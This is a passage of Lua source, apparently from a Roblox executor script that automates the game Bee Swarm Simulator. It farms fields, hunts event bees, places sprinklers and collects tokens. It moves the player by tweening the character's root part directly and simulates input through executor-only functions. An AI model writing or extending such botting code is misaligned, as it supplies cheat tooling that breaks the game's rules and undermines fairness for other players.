            
            -- Save current field and track which sprout field we're farming
            if self.lastFieldChangeSource == "autofarm" or not self.lastFieldChangeSource then
                self.originalAutoFarmField = self.selectedOption

            end
            
            self.lastFieldChangeSource = "sprout"
            self.currentSproutField = sproutField.Name  -- Track which sprout field we're farming
            self.selectedOption = sproutField.Name
            self.sprinklersPlaced = false
            self.status = "Going to Sprout Field"
            self.needsRedraw = true
            lastSelectedField = sproutField.Name
            
            -- Tween to sprout field
            local flowerZones = game.Workspace.FlowerZones
            if flowerZones then
                local targetZone = flowerZones:FindFirstChild(sproutField.Name)
                if targetZone then
                    local fieldCenterPos = Vector3.new(targetZone.Position.X, targetZone.Position.Y + 10, targetZone.Position.Z)

                    self:QueueTween(hrp, fieldCenterPos, true)
                    
                    while self.processingTween and self.autoFarmEnabled do
                        if checkAndHandleDeath() then
                            break
                        end
                        wait(0.1)
                    end
                    

                    wait(0.5)
                end
            end
        elseif self.currentSproutField == sproutField.Name then
            -- Already farming this sprout field, continue farming

        else
            -- Different sprout spawned, but we're committed to current one

        end
    else
        -- No Sprout found - check if we WERE farming a sprout
        if self.currentSproutField then
    -- Sprout in OUR field despawned!
    local returnField = self.originalAutoFarmField or self.selectedOption


    
    self.currentSproutField = nil  -- Clear tracked sprout field
    self.status = "Collecting Sprout Tokens"
    self.needsRedraw = true
    self.collectingSproutTokens = true
    
    -- âœ“ USE YOUR ACTUAL TOKEN COLLECTOR
    self.sproutCollectionEndTime = os.clock() + 20
    local collectStartTime = os.clock()
    

    
    while self.autoFarmEnabled and (os.clock() - collectStartTime) < 20 do
        -- PRIORITY CHECK: Pollen full?
        local coreStats = player:FindFirstChild("CoreStats")
        if coreStats then
            local pollen = coreStats:FindFirstChild("Pollen")
            local capacity = coreStats:FindFirstChild("Capacity")
            if pollen and capacity and pollen.Value >= capacity.Value then

                StopWalking()
                break
            end
        end
        
        -- PRIORITY CHECK: Time limit?
        local gatherTimeSeconds = self.gatherTime * 60
        local timeElapsed = os.clock() - (self.gatherStartTime or os.clock())
        if timeElapsed >= gatherTimeSeconds then

            StopWalking()
            break
        end
        
        -- PRIORITY CHECK: Death?
        character = player.Character
        if character then
            local humanoid = character:FindFirstChild("Humanoid")
            if humanoid and humanoid.Health <= 0 then

                StopWalking()
                break
            end
        end
        
        -- PRIORITY CHECK: Vicious Bee spawned?
        if self.killViciousBee then
            local viciousBeeData = self:CheckForViciousBee()
            if viciousBeeData then

                StopWalking()
                break
            end
        end
        
        -- PRIORITY CHECK: Windy Bee spawned?
        if self.killWindy then
            local windyBeeData = self:CheckForWindyBee()
            if windyBeeData then

                StopWalking()
                break
            end
        end
        
        -- âœ“âœ“âœ“ USE THE REAL TokenCollector FUNCTION
        local collectedToken = self:TokenCollector(false)  -- false = don't check if in field
        
        if not collectedToken then
            wait(0.5)
        end
        
        -- Check if time is up
        if os.clock() >= self.sproutCollectionEndTime then

            break
        end
    end
        end
    end
else

end

-- Check if field selection changed
if self.selectedOption ~= lastSelectedField then

    lastSelectedField = self.selectedOption
    originalField = self.selectedOption  -- Update global field storer
    self.sprinklersPlaced = false  -- Reset sprinkler flag on field change
    walkedToViciousOnce = false  -- Reset vicious walk flag on field change
    if not self.lastFieldChangeSource or self.lastFieldChangeSource == "autofarm" then
        self.originalAutoFarmField = self.selectedOption
        self.lastFieldChangeSource = "autofarm"
    end
end 
-- Check for Vicious Bee
if self.killViciousBee then
    local viciousBeeData = self:CheckForViciousBee()
    
    if viciousBeeData then
        local viciousBeeField = viciousBeeData.field
        local viciousBeePos = viciousBeeData.position
        
        -- Vicious Bee is present
        if not self.huntingVicious then
    -- Just started hunting

    
    -- Save the current auto-farm field BEFORE switching
    if self.lastFieldChangeSource == "autofarm" or not self.lastFieldChangeSource then
        self.originalAutoFarmField = self.selectedOption

    end
    
    self.lastFieldChangeSource = "vicious"
    
    self.selectedOption = viciousBeeField.Name
    self.sprinklersPlaced = false
    self.huntingVicious = true
    self.walkedToViciousOnce = false
    self.status = "Going to Vicious Bee Field"
    self.needsRedraw = true
    lastSelectedField = viciousBeeField.Name
    
    -- STEP 1: Tween to the field center first
    local flowerZones = game.Workspace.FlowerZones
    if flowerZones then
        local targetZone = flowerZones:FindFirstChild(viciousBeeField.Name)
        if targetZone then
            local fieldCenterPos = Vector3.new(targetZone.Position.X, targetZone.Position.Y + 10, targetZone.Position.Z)

            self:QueueTween(hrp, fieldCenterPos, true)
            
            -- Wait for tween to complete
            while self.processingTween and self.autoFarmEnabled do
                if checkAndHandleDeath() then
                    break
                end
                wait(0.1)
            end
            

            wait(0.5)
        end
    end
                            
                           -- STEP 2: Walk to Vicious Bee position ONCE
if self.autoFarmEnabled and not self.walkedToViciousOnce then
    -- Get fresh Vicious Bee position
    viciousBeeData = self:CheckForViciousBee()
    if viciousBeeData then
        viciousBeePos = viciousBeeData.position
        
        self.status = "Walking to Vicious Bee"
        self.needsRedraw = true

        WalkTo(viciousBeePos)
        
        -- Wait for arrival with death checks AND position updates
        local startTime = os.clock()
        local lastUpdateTime = os.clock()
        
        while IsWalking() and self.autoFarmEnabled do
            if checkAndHandleDeath() then
                break
            end
            
            -- Update Vicious Bee position every 0.5 seconds
            if os.clock() - lastUpdateTime >= 0.5 then
                viciousBeeData = self:CheckForViciousBee()
                if viciousBeeData then
                    viciousBeePos = viciousBeeData.position
                    WalkTo(viciousBeePos)

                end
                lastUpdateTime = os.clock()
            end
            
            -- âœ“ FIX: Check distance WITHOUT Y-axis (only X and Z)
            hrp = character:FindFirstChild("HumanoidRootPart")
            if hrp then
                local currentPos = hrp.Position
                local dx = currentPos.X - viciousBeePos.X
                local dz = currentPos.Z - viciousBeePos.Z
                local distance2D = math.sqrt(dx * dx + dz * dz)
                
                -- Arrived if within 15 studs on ground plane (ignoring Y)
                if distance2D < 15 then

                    StopWalking()
                    break
                end
            end
            
            if os.clock() - startTime > 15 then

                StopWalking()
                break
            end
            
            wait(0.1)
        end
        
        StopWalking()
        self.walkedToViciousOnce = true

        self.status = "Hunting Vicious Bee"
        self.needsRedraw = true
    end
end
                            
                        elseif viciousBeeField.Name ~= self.selectedOption then
                            -- Vicious Bee moved to a different field

                            self.selectedOption = viciousBeeField.Name
                            self.sprinklersPlaced = false
                            walkedToViciousOnce = false
                            lastSelectedField = viciousBeeField.Name
                            
                            -- STEP 1: Tween to new field center
                            local flowerZones = game.Workspace.FlowerZones
                            if flowerZones then
                                local targetZone = flowerZones:FindFirstChild(viciousBeeField.Name)
                                if targetZone then
                                    local fieldCenterPos = Vector3.new(targetZone.Position.X, targetZone.Position.Y + 10, targetZone.Position.Z)

                                    self.status = "Following to New Field"
                                    self.needsRedraw = true
                                    self:QueueTween(hrp, fieldCenterPos, true)
                                    
                                    -- Wait for tween to complete
                                    while self.processingTween and self.autoFarmEnabled do
                                        if checkAndHandleDeath() then
                                            break
                                        end
                                        wait(0.1)
                                    end
                                    

                                    wait(0.5)
                                end
                            end
                            
                            -- STEP 2: Walk to new Vicious Bee position ONCE
                            if self.autoFarmEnabled and not self.walkedToViciousOnce then
                                -- Get fresh Vicious Bee position
                                viciousBeeData = self:CheckForViciousBee()
                                if viciousBeeData then
                                    viciousBeePos = viciousBeeData.position
                                    
                                    self.status = "Walking to Vicious Bee"
                                    self.needsRedraw = true

                                    WalkTo(viciousBeePos)
                                    
                                    -- Wait for arrival with death checks
                                    local startTime = os.clock()
                                    while IsWalking() and self.autoFarmEnabled do
                                        if checkAndHandleDeath() then
                                            break
                                        end
                                        
                                        if os.clock() - startTime > 15 then

                                            StopWalking()
                                            break
                                        end
                                        
                                        wait(0.1)
                                    end
                                    
                                    StopWalking()
                                    self.walkedToViciousOnce = true

                                end
                            end
                        end
                        -- If already hunting in same field, just continue farming (don't walk to Vicious Bee again)
                    else
    -- No Vicious Bee found
    if self.huntingVicious then
        -- Was hunting, but now it's gone
        local returnField = self.originalAutoFarmField or self.selectedOption

        
        self.selectedOption = returnField
        self.lastFieldChangeSource = "autofarm"
        self.sprinklersPlaced = false
        self.huntingVicious = false
        walkedToViciousOnce = false
        self.status = "Returning to Original Field"
        self.needsRedraw = true
        lastSelectedField = returnField
        
        -- Stop walking
        StopWalking()
        
        -- Tween back to original field
        local flowerZones = game.Workspace.FlowerZones
        if flowerZones then
            local targetZone = flowerZones:FindFirstChild(returnField)
            if targetZone then
                local targetPos = Vector3.new(targetZone.Position.X, targetZone.Position.Y + 10, targetZone.Position.Z)
                self:QueueTween(hrp, targetPos, true)
                
                -- Wait for tween to complete
                while self.processingTween and self.autoFarmEnabled do
                    if checkAndHandleDeath() then
                        break
                    end
                    wait(0.1)
                end
                

                self.status = "Auto Farm Active"
                self.needsRedraw = true
            end
        end
    end
end
                end
                
                local flowerZones = game.Workspace.FlowerZones
                if not flowerZones then
                    wait(1)
                    return
                end
                
                local targetZone = flowerZones:FindFirstChild(self.selectedOption)
                
                if not targetZone then

                    self.status = "Field not found!"
                    wait(5)
                    return
                end
                
                -- Check if player is in the selected field
                local hrpPos = hrp.Position
                local fieldPos = targetZone.Position
                local fieldSize = targetZone.Size
                
                local withinX = math.abs(hrpPos.X - fieldPos.X) <= fieldSize.X / 2
                local withinZ = math.abs(hrpPos.Z - fieldPos.Z) <= fieldSize.Z / 2
                local withinY = math.abs(hrpPos.Y - fieldPos.Y) <= 50
                
                local inField = withinX and withinZ and withinY
                
                if inField then
                    if not hasReachedFieldOnce then
                        hasReachedFieldOnce = true

                    end
                    -- CRITICAL: Check if Windy Bee moved to a different field
                    if self.killWindy then
                        local windyBeeData = self:CheckForWindyBee()
                        if windyBeeData and windyBeeData.field.Name ~= self.selectedOption then

                            StopWalking()
                            self:ClearTweenQueue()
                            wait(0.5)
                            -- Let the main loop handle the field switch
                            wait(1)
                            return
                        end
                    end
                    
                    -- CRITICAL: Check for thorns if hunting Vicious Bee
                    if self.huntingVicious then
                        local thornData = self:CheckForThornsNearby(4)
                        if thornData then

                            self.status = "Evading Thorns"
                            self.needsRedraw = true
                            
                            StopWalking()
                            
                            -- Calculate escape direction (away from thorn)
                            local thornPos = thornData.position
                            local escapeX = hrpPos.X + (hrpPos.X - thornPos.X) * 3
                            local escapeZ = hrpPos.Z + (hrpPos.Z - thornPos.Z) * 3
                            local escapePos = Vector3.new(escapeX, hrpPos.Y, escapeZ)
                            

                            WalkTo(escapePos)
                            
                            local startTime = os.clock()
                            while IsWalking() and self.autoFarmEnabled do
                                if os.clock() - startTime > 3 then
                                    StopWalking()
                                    break
                                end
                                wait(0.1)
                            end
                            
                            StopWalking()
                            wait(0.5)
                            
                            -- Skip to next loop iteration
                            wait(1)
                            return
                        end
                    end
    
                    -- Check if sprinklers need to be placed FIRST
                    if self.useSprinkler and not self.sprinklersPlaced then

                        self.status = "Placing Sprinklers"
                        self.needsRedraw = true
                        
                        -- Stop any movement
                        StopWalking()
                        self:ClearTweenQueue()
                        
                        -- Walk to center position
                        local centerPos = Vector3.new(targetZone.Position.X, targetZone.Position.Y + 10, targetZone.Position.Z)

                        WalkTo(centerPos)
                        
                        -- Wait for arrival at center
                        local walkStartTime = os.clock()
                        while IsWalking() and self.autoFarmEnabled do
                            if os.clock() - walkStartTime > 10 then

                                StopWalking()
                                break
                            end
                            
                            hrp = character:FindFirstChild("HumanoidRootPart")
                            if hrp then
                                local currentPos = hrp.Position
                                local dx = currentPos.X - centerPos.X
                                local dz = currentPos.Z - centerPos.Z
                                local distSquared = dx * dx + dz * dz
                                
                                if distSquared < 25 then

                                    StopWalking()
                                    break
                                end
                            end
                            
                            wait(0.1)
                        end
                        
                        StopWalking()
                        wait(0.3)
                        
                        -- Place sprinklers

                        self:UseSprinkler()
                        
                        self.sprinklersPlaced = true

                    end    
                    
                    -- Check for death before targeting
                    if not checkAndHandleDeath() then
                        local collectedToken = self:TokenCollector()
                        
                        if not collectedToken then
                            self.status = huntingVicious and "Hunting Vicious Bee" or ("Farming at " .. self.selectedOption)
                            wait(0.5)
                        end
                    end
                else
                    self.status = "Returning to " .. self.selectedOption
                    
                    local startPos = hrp.Position
                    local targetPos = Vector3.new(targetZone.Position.X, targetZone.Position.Y + 10, targetZone.Position.Z)
                    
                    local dx = targetPos.X - startPos.X
                    local dy = targetPos.Y - startPos.Y
                    local dz = targetPos.Z - startPos.Z
                    local distance = math.sqrt(dx * dx + dy * dy + dz * dz)
                    
                    self:QueueTween(hrp, targetPos)
                    
                    while self.processingTween and self.autoFarmEnabled do
                        -- Check for death during tween
                        if checkAndHandleDeath() then
                            break
                        end
                        
                        if self.selectedOption ~= lastSelectedField then

                            self:ClearTweenQueue()
                            break
                        end
                        
                        wait(0.1)
                    end
                end
            end)
            
            if not success then
                wait(2)
            end
            
            wait(0.5)
        end
        
        self.autoFarmRunning = false
        self.status = "Stopped"
    end)
end

function UI:StopAutoFarm()

    
    -- Kill thread first
    if self.autoFarmThread then
        task.cancel(self.autoFarmThread)
        self.autoFarmThread = nil
    end
    
    self:StopTimedActionsHandler()
    self.autoFarmRunning = false
    self.autoFarmEnabled = false
    self:ClearTweenQueue()
    StopWalking()
    
    self.status = "Stopped"
    self.needsRedraw = true
    

end

function UI:StartAutoDig()
    if self.autoDigRunning then

        return
    end
    
    self.autoDigRunning = true
    
    spawn(function()
        while self.autoDigEnabled and self.autoDigRunning do
            -- Check if Roblox window is active
            if isrbxactive() then
                mouse1press()
                wait(10)
                mouse1release()
                wait(0.5)
            else
                warn("isrbxactive = false - auto dig")
                wait(0.5)
            end
        end
        
        self.autoDigRunning = false
        mouse1release()
    end)
end

function UI:StopAutoDig()
    self.autoDigRunning = false
    self.autoDigEnabled = false
    mouse1release()
end

function UI:QueueTween(hrp, targetPos, priority)
    local tweenData = {hrp = hrp, targetPos = targetPos, priority = priority or false}
    
    if priority then
        self:ClearTweenQueue()
        table.insert(self.tweenQueue, tweenData)

    else
        table.insert(self.tweenQueue, tweenData)

    end
    
    if not self.processingTween then
        self:ProcessTweenQueue()
    else
        warn("Tween Failure 1")
    end
end
function UI:ProcessTweenQueue()
    if self.processingTween then 
        warn("Multiple Not Allowed w-2")
        return 
    end
    
    spawn(function()
        while #self.tweenQueue > 0 and (self.autoFarmEnabled or self.killCoconutCrab or self.trainSnail) do
            self.processingTween = true
            
            local tweenData = table.remove(self.tweenQueue, 1)
            local hrp = tweenData.hrp
            local targetPos = tweenData.targetPos
            
            if not hrp or not hrp.Parent then
                self.processingTween = false
                continue
            end
            
            -- Disable animations RIGHT before tween starts

            local startPos = hrp.Position
            local dx = targetPos.X - startPos.X
            local dy = targetPos.Y - startPos.Y
            local dz = targetPos.Z - startPos.Z
            local distance = math.sqrt(dx * dx + dy * dy + dz * dz)
            local tweenTime = distance / self.tweenSpeed
            local tweenInfo = TweenInfo.new(tweenTime, "Linear", "None")
            self.currentTween = TweenService:Create(hrp, tweenInfo, {Position = targetPos})
            
            self.currentTween:Play()
            
            local startTime = os.clock()
            while self.currentTween and self.currentTween.IsPlaying and (self.autoFarmEnabled or self.killCoconutCrab or self.trainSnail) do
                wait(0.1)
                
                if os.clock() - startTime > tweenTime + 5 then

                    break
                end
            end
            self.currentTween = nil
            
            -- Re-enable animations RIGHT after tween ends

            
            wait(0.2)
        end
        
        self.processingTween = false
        self.tweenQueue = {}
    end)
end

function UI:ClearTweenQueue()
    self.tweenQueue = {}
    if self.currentTween then
        self.currentTween:Stop()
        self.currentTween = nil
    end
    self.processingTween = false
end

function UI:UseSprinkler()
    if not isrbxactive() then
        warn("isrbxactive = false - sprinkler")
        return false
    end
    
    local clickCount = 0
    local keyCode = 0x31
    
    if self.selectedSprinkler:find("Basic") then
        clickCount = 1
    elseif self.selectedSprinkler:find("Silver") then
        clickCount = 2
    elseif self.selectedSprinkler:find("Gold") then
        clickCount = 3
    elseif self.selectedSprinkler:find("Diamond") then
        clickCount = 4
    elseif self.selectedSprinkler:find("Supreme") then
        clickCount = 1
    elseif self.selectedSprinkler:find("None") then

        return true
    end
    
    if clickCount == 0 then

        return true
    end
    

    
    for i = 1, clickCount do

        
        -- Jump
        keypress(0x20)  -- Space bar
        wait(0.05)
        keyrelease(0x20)
        
        wait(0.3)  -- Wait 300ms after jump
        
        -- Place sprinkler
        keypress(keyCode)
        wait(0.1)
        keyrelease(keyCode)
        

        
        -- Wait 1.1s before next sprinkler (if not the last one)
        if i < clickCount then
            wait(1.1)
        end
    end
    

    return true
end

-- ============================================================
-- UNIFIED TARGET SYSTEM - Treats all collectibles equally
-- ============================================================

function UI:FindAllTargetsInField()
    local player = game.Players.LocalPlayer
    local character = player.Character
    if not character then return {} end
    
    local hrp = character:FindFirstChild("HumanoidRootPart")
    if not hrp then return {} end
    
    local targets = {}
    local hrpPos = hrp.Position
    
    -- Get field info
    local flowerZones = game.Workspace.FlowerZones
    if not flowerZones or not self.selectedOption then return {} end
    
    local targetZone = flowerZones:FindFirstChild(self.selectedOption)
    if not targetZone then return {} end
    
    local fieldPos = targetZone.Position
    local fieldSize = targetZone.Size
    
    if self.autoGrindBlooms then
        local happenings = game.Workspace:FindFirstChild("Happenings")
        if happenings then
            local poppablePlants = happenings:FindFirstChild("PoppablePlants")
            if poppablePlants then
                for _, child in pairs(poppablePlants:GetChildren()) do
                    if child:IsA("Model") and child.Name == "Bloom" then
                        local stem = child:FindFirstChild("Stem")
                        if stem and stem:IsA("BasePart") then
                            local stemPos = stem.Position
                            local dx = math.abs(stemPos.X - fieldPos.X)
                            local dz = math.abs(stemPos.Z - fieldPos.Z)
                            local dy = math.abs(stemPos.Y - fieldPos.Y)
                            
                            local withinX = dx <= fieldSize.X / 2
                            local withinZ = dz <= fieldSize.Z / 2
                            local withinY = dy <= 50
                            
                            if withinX and withinZ and withinY then
                                local distance = math.sqrt((hrpPos.X - stemPos.X)^2 + (hrpPos.Y - stemPos.Y)^2 + (hrpPos.Z - stemPos.Z)^2)
                                table.insert(targets, {
                                    type = "bloom",
                                    position = stemPos,
                                    object = stem,
                                    distance = distance
                                })
                            end
                        end
                    end
                end
            end
        end
    end
    

    -- 2. TOKENS

    if self.collectTokens then
        local collectibles = game.Workspace:FindFirstChild("Collectibles")
        if collectibles then
            for _, token in pairs(collectibles:GetChildren()) do
                if token.Name == "C" and token:IsA("BasePart") then
                    local tokenPos = token.Position
                    local distance = math.sqrt((hrpPos.X - tokenPos.X)^2 + (hrpPos.Y - tokenPos.Y)^2 + (hrpPos.Z - tokenPos.Z)^2)
                    
                    table.insert(targets, {
                        type = "token",
                        position = tokenPos,
                        object = token,
                        distance = distance
                    })
                end
            end
        end
    end
    
    -- 3. BALLOONS
    if self.farmUnderBalloons then
        local balloon = self:FindBalloonInField()
        if balloon then
            local balloonPos = balloon.Position
            local distance = math.sqrt((hrpPos.X - balloonPos.X)^2 + (hrpPos.Y - balloonPos.Y)^2 + (hrpPos.Z - balloonPos.Z)^2)
            
            table.insert(targets, {
                type = "balloon",
                position = balloonPos,
                object = balloon,
                distance = distance
            })
        end
    end
    
    -- 4. CLOUDS
    if self.farmUnderClouds then
        local cloud = self:FindCloudInField()
        if cloud then
            local cloudPos = cloud.Position
            local distance = math.sqrt((hrpPos.X - cloudPos.X)^2 + (hrpPos.Y - cloudPos.Y)^2 + (hrpPos.Z - cloudPos.Z)^2)
            
            table.insert(targets, {
                type = "cloud",
                position = cloudPos,
                object = cloud,
                distance = distance
            })
        end
    end
    
    -- 5. BUBBLES
    if self.farmBubbles then
        local bubbles = self:CheckForBubblesInField()
        if bubbles and #bubbles > 0 and #bubbles <= 3 then
            for _, bubble in ipairs(bubbles) do
                local bubblePos = bubble.Position
                local distance = math.sqrt((hrpPos.X - bubblePos.X)^2 + (hrpPos.Y - bubblePos.Y)^2 + (hrpPos.Z - bubblePos.Z)^2)
                
                table.insert(targets, {
                    type = "bubble",
                    position = bubblePos,
                    object = bubble,
                    distance = distance
                })
            end
        end
    end
    
    -- 6. FLAMES
    if self.farmFlames then
        local flames = self:CheckForFlamesInField()
        if flames and #flames > 0 then
            for _, flame in ipairs(flames) do
                local flamePos = flame.Position
                local distance = math.sqrt((hrpPos.X - flamePos.X)^2 + (hrpPos.Y - flamePos.Y)^2 + (hrpPos.Z - flamePos.Z)^2)
                
                table.insert(targets, {
                    type = "flame",
                    position = flamePos,
                    object = flame,
                    distance = distance
                })
            end
        end
    end
    
    table.sort(targets, function(a, b) return a.distance < b.distance end)
    
    return targets
end

function UI:GoToNearestTarget(target)
    if not target then return false end
    
    local targetPos = target.position
    local targetType = target.type
    WalkTo(targetPos)
    local startTime = os.clock()
    local timeoutSeconds = 15
    
    while IsWalking() and self.autoFarmEnabled do
        local player = game.Players.LocalPlayer
        local character = player.Character
        if character then
            local hrp = character:FindFirstChild("HumanoidRootPart")
            if hrp then
                local currentPos = hrp.Position
                local dx = currentPos.X - targetPos.X
                local dz = currentPos.Z - targetPos.Z
                local distance2D = math.sqrt(dx * dx + dz * dz)
                
                if distance2D < 10 then
                    StopWalking()
                    return true
                end
            end
        end
        
        if os.clock() - startTime > timeoutSeconds then

            StopWalking()
            return false
        end
        
        wait(0.1)
    end
    
    StopWalking()
    return false
end

function UI:HandleTarget(target)
    if not target then return false end
    
    local targetType = target.type
    
    if targetType == "bloom" then
        return self:GrindBloom(target.object)
    elseif targetType == "token" then
        -- Tokens are passively collected
        return true
    elseif targetType == "balloon" then
        return self:FarmUnderBalloon(target.object)
    elseif targetType == "cloud" then
        return self:FarmUnderCloud(target.object)
    elseif targetType == "bubble" then
        return self:FarmBubbles({target.object})
    elseif targetType == "flame" then
        return self:FarmFlames({target.object})
    end
    
    return false
end

function UI:TokenCollector(checkField)
    if checkField == nil then checkField = true end  -- Default to checking field
    
    if not self.autoFarmEnabled then
        return false
    end
    
    if not self.collectTokens then
        return false
    end
    
    local player = game.Players.LocalPlayer
    local character = player.Character
    if not character then return false end
    
    local hrp = character:FindFirstChild("HumanoidRootPart")
    if not hrp then return false end
    
    local collectibles = game.Workspace:FindFirstChild("Collectibles")
    if not collectibles then return false end
    
    local startingField = self.selectedOption


    -- Initialize last field center time if not exists
    if not self.lastFieldCenterTime then
        self.lastFieldCenterTime = os.clock()
        self.nextFieldCenterInterval = math.random(60, 90)
    end
    
    -- Initialize all cooldown timers
    if not self.lastBalloonCheckTime then
        self.lastBalloonCheckTime = 0
    end
    if not self.lastCloudTime then
        self.lastCloudTime = 0
    end
    if not self.nextCloudInterval then
        self.nextCloudInterval = math.random(10, 15)
    end
    if not self.lastBubbleCheckTime then
        self.lastBubbleCheckTime = 0
    end
    if not self.lastFlameCheckTime then
        self.lastFlameCheckTime = 0
    end
    
    local tokensCollected = 0
    local recentTokens = {}
    
while self.autoFarmEnabled and self.collectTokens do
    -- CRITICAL: Check gather time inside token collector
    local gatherTimeSeconds = self.gatherTime * 60
    local timeElapsed = os.clock() - (self.gatherStartTime or os.clock())
    local gatherTimeFull = timeElapsed >= gatherTimeSeconds
    
    if gatherTimeFull then

        StopWalking()
        return false  -- Exit token collector to trigger hive return
    end
    
    -- CRITICAL: Check for death at start of token collection loop
    character = player.Character
    if character then
        local humanoid = character:FindFirstChild("Humanoid")
        if humanoid and humanoid.Health <= 0 then

            StopWalking()
            return false
        end
    else

        return false
    end

    -- CRITICAL: Check if sprout despawned during token collection
    -- BUT ONLY if we're actively farming sprouts (not during the 20s collection period)
    if self.farmSprouts and self.lastFieldChangeSource == "sprout" and not self.collectingSproutTokens then

        local sproutData = self:CheckForSprouts()
        if not sproutData then

            StopWalking()
            return false
        end
    end

    -- CRITICAL: Check if Windy Bee moved to a different field
    if self.killWindy then
        local windyBeeData = self:CheckForWindyBee()
        if windyBeeData and windyBeeData.field.Name ~= self.selectedOption then

            StopWalking()
            return false
        end
    end

    if self.sproutCollectionEndTime and os.clock() >= self.sproutCollectionEndTime then

        StopWalking()
        return false
    end

    if self.autoGrindBlooms then
        local bloom = self:CheckForBlooms()
        if bloom then
            StopWalking()
            self:GrindBloom(bloom)
        end
    end

    if self.killViciousBee and self.huntingVicious then
        local viciousBeeData = self:CheckForViciousBee()

        if not viciousBeeData then

            StopWalking()
            return false
        elseif viciousBeeData.field.Name ~= self.selectedOption then
            StopWalking()
            return false
        end
    end

    local currentTime = os.clock()
 
        local coreStats = player:FindFirstChild("CoreStats")
        if coreStats then
            local pollen = coreStats:FindFirstChild("Pollen")
            local capacity = coreStats:FindFirstChild("Capacity")
            if pollen and capacity then
                local pollenValue = pollen.Value
                local capacityValue = capacity.Value
                
                if pollenValue >= capacityValue then

                    StopWalking()
                    return true
                end
            end
        end

        if self.farmUnderBalloons then
            if currentTime - self.lastBalloonCheckTime >= 5 then
                local balloon = self:FindBalloonInField()
                if balloon then

                    StopWalking()
                    self:FarmUnderBalloon(balloon)
                end
                self.lastBalloonCheckTime = currentTime
            end
        end

        if self.farmUnderClouds then
            if currentTime - self.lastCloudTime >= self.nextCloudInterval then
                local cloud = self:FindCloudInField()
                if cloud then

                    StopWalking()
                    self:FarmUnderCloud(cloud)
                    self.nextCloudInterval = math.random(10, 15)
                else
                    self.lastCloudTime = currentTime
                    self.nextCloudInterval = 2
                end
            end
        end
        
        if self.farmBubbles then
            if currentTime - self.lastBubbleCheckTime >= 3 then
                local bubbles = self:CheckForBubblesInField()
                if bubbles and #bubbles > 0 and #bubbles <= 3 then

                    StopWalking()
                    self:FarmBubbles(bubbles)
                end
                self.lastBubbleCheckTime = currentTime
            end
        end
        
        if self.farmFlames then
            if currentTime - self.lastFlameCheckTime >= 6 then
                local flames = self:CheckForFlamesInField()
                if flames and #flames > 0 then

                    StopWalking()
                    self:FarmFlames(flames)
                end
                self.lastFlameCheckTime = currentTime
            end
        end
        
        hrp = character:FindFirstChild("HumanoidRootPart")
        if hrp then
            local flowerZones = game.Workspace.FlowerZones
            if flowerZones and self.selectedOption then
                local targetZone = flowerZones:FindFirstChild(self.selectedOption)
                if targetZone then
                    local hrpPos = hrp.Position
                    local fieldPos = targetZone.Position
                    local fieldSize = targetZone.Size
                    
                    local withinX = math.abs(hrpPos.X - fieldPos.X) <= fieldSize.X / 2
                    local withinZ = math.abs(hrpPos.Z - fieldPos.Z) <= fieldSize.Z / 2
                    local withinY = math.abs(hrpPos.Y - fieldPos.Y) <= 50
                    
                    local inField = withinX and withinZ and withinY
                    
                    if not inField then
                        -- If farming sprouts, just walk back to field center
                        if self.farmSprouts and self.lastFieldChangeSource == "sprout" then

                            local centerPos = Vector3.new(fieldPos.X, fieldPos.Y + 5, fieldPos.Z)
                            WalkTo(centerPos)
                            WaitForArrival(10, 10)
                            StopWalking()
                            wait(0.1)
                        else

                            StopWalking()
                            return false
                        end
                    end
                end
            end
        end
        
        if currentTime - self.lastFieldCenterTime >= self.nextFieldCenterInterval then

            self.status = "Returning to center"
            
            local flowerZones = game.Workspace.FlowerZones
            if flowerZones and self.selectedOption then
                local targetZone = flowerZones:FindFirstChild(self.selectedOption)
                if targetZone then
                    local centerPos = Vector3.new(targetZone.Position.X, targetZone.Position.Y + 10, targetZone.Position.Z)
                    WalkTo(centerPos)
                    WaitForArrival(10, 10)
                    StopWalking()
                    wait(0.5)
                end
            end
            
            self.lastFieldCenterTime = os.clock()
            self.nextFieldCenterInterval = math.random(60, 90)
            recentTokens = {}
        end
        
hrp = character:FindFirstChild("HumanoidRootPart")
if not hrp then break end
local hrpPos = hrp.Position

local function ScanNearbyTokens(playerPos)
    local nearbyTokens = {}
    
    for _, token in pairs(collectibles:GetChildren()) do
        if token.Name == "C" and token:IsA("BasePart") and token.Parent then
            local tokenPos = token.Position
            if tokenPos then
                local isRecent = false
                for _, recentPos in ipairs(recentTokens) do
                    local dx = math.abs(tokenPos.X - recentPos.X)
                    local dy = math.abs(tokenPos.Y - recentPos.Y)
                    local dz = math.abs(tokenPos.Z - recentPos.Z)
                    if dx < 3 and dy < 3 and dz < 3 then
                        isRecent = true
                        break
                    end
                end
                
                if not isRecent then
                    local dy = math.abs(playerPos.Y - tokenPos.Y)
                    if dy <= 10 then
                        local dx = playerPos.X - tokenPos.X
                        local dz = playerPos.Z - tokenPos.Z
                        local distSquared = dx * dx + dz * dz
                        
                        -- Collect tokens within 50 studs
                        if distSquared < 2500 then
                            table.insert(nearbyTokens, {
                                position = tokenPos,
                                distance = math.sqrt(distSquared)
                            })
                        end
                    end
                end
            end
        end
    end
    
    return nearbyTokens
end

-- Initial scan for tokens
local nearbyTokens = ScanNearbyTokens(hrpPos)

-- STEP 2: Use TSP to find optimal collection path
if #nearbyTokens > 0 then
    local optimalPath = self:CalculateTSPPath(hrpPos, nearbyTokens)
    local currentPathIndex = 1
    local lastRescanTime = os.clock()
    
    -- STEP 3: Collect tokens with live re-scanning (0.1s intervals)
    while currentPathIndex <= #optimalPath and self.autoFarmEnabled and self.collectTokens do

        if self.selectedOption ~= startingField then

            StopWalking()
            return false
        end
        hrp = character:FindFirstChild("HumanoidRootPart")
        if hrp then
            local flowerZones = game.Workspace.FlowerZones
            if flowerZones and self.selectedOption then
                local targetZone = flowerZones:FindFirstChild(self.selectedOption)
                if targetZone then
                    local hrpPos = hrp.Position
                    local fieldPos = targetZone.Position
                    local fieldSize = targetZone.Size
                    
                    local withinX = math.abs(hrpPos.X - fieldPos.X) <= fieldSize.X / 2
                    local withinZ = math.abs(hrpPos.Z - fieldPos.Z) <= fieldSize.Z / 2
                    local withinY = math.abs(hrpPos.Y - fieldPos.Y) <= 50
                    
                    if not withinX or not withinZ or not withinY then

                        StopWalking()
                        return false
                    end
                end
            end
        end
        
        local targetToken = optimalPath[currentPathIndex]
        
        -- Check if we should rescan for better tokens (every 0.1 seconds)
        hrp = character:FindFirstChild("HumanoidRootPart")
        if hrp and os.clock() - lastRescanTime >= 0.1 then
            local currentPos = hrp.Position
            local newTokens = ScanNearbyTokens(currentPos)
            
            -- If we found new tokens or significantly more tokens, recalculate path
